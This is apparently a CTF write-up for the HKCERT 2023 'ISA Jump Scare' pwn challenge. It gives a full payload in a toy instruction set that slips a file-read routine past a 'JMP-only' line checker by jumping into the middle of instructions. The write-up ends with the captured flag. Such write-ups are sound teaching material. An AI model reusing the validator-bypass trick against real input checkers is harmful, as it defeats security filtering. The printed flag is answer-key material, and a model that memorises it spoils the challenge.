In this challenge we are also provided with a small step-by-step, though it's mostly just pushing in the right direction:
https://hackmd.io/@blackb6a/hkcert-ctf-2023-i-en-a58d115f39feab46#ISA-%E5%A7%8B%E6%96%99%E6%9C%AA%E5%8F%8A--ISA-Jump-Scare-Pwn

We get hinted at using the ability to JMP to the middle of instructions, since the checker only checks for no comments as well as the fact that every line has to start with "JMP ".

So, we have to take the rest from there.

We are provided with this nice "read file" example in the ISA docs: https://hackmd.io/@blackb6a/bauhinia-isa#Example1

Code to read input into 0x410000 (we will write "flag.txt").
```
MOV R8, 0
MOV R1, 0x410000
MOV R2, 100
SYSCALL
```

Code to read file with name that we just put in, and store contents in 0x420000.
```
MOV R8, 3
MOV R1, 0x410000
MOV R2, 0x420000
MOV R3, 100
SYSCALL
```

And to put file output to stdout:
```
MOV R2, R8
MOV R8, 1
MOV R1, 0x420000
SYSCALL
```

Now, we should be able to do this to trick it to run:

```
JMP +4
JMP MOV R8, 0
JMP +4
JMP MOV R1, 0x410000
JMP +4
JMP MOV R2, 100
JMP +4
JMP SYSCALL
JMP +4
JMP MOV R8, 3
JMP +4
JMP MOV R1, 0x410000
JMP +4
JMP MOV R2, 0x420000
JMP +4
JMP MOV R3, 100
JMP +4
JMP SYSCALL
JMP +4
JMP MOV R2, R8
JMP +4
JMP MOV R8, 1
JMP +4
JMP MOV R1, 0x420000
JMP +4
JMP SYSCALL
```

Flag: got! very nice (in Borat voice)

hkcert23{jump_1n70_m1dd13_0f_1n57ruc710n_1s_r34l1y_fun}